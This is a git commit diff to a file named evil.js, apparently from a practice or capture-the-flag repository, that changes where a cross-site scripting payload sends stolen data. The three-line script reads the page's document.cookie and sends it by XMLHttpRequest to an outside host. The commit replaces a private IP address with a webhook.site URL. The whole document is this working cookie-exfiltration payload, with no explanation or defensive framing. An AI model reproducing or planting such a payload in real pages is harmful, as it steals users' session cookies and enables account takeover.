35157ffb0fbd2e16c7fa5977716c98b742e382ca
David Donika <daviddonikapanjaitan@gmail.com>
2023-07-09 05:29:49 +0700

    add webhook

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://10.10.16.19/?' + document.cookie, true);
+xhttp.open('GET', 'https://webhook.site/90f3b677-b980-40da-8463-5494f07066ea/?' + document.cookie, true);
 xhttp.send();
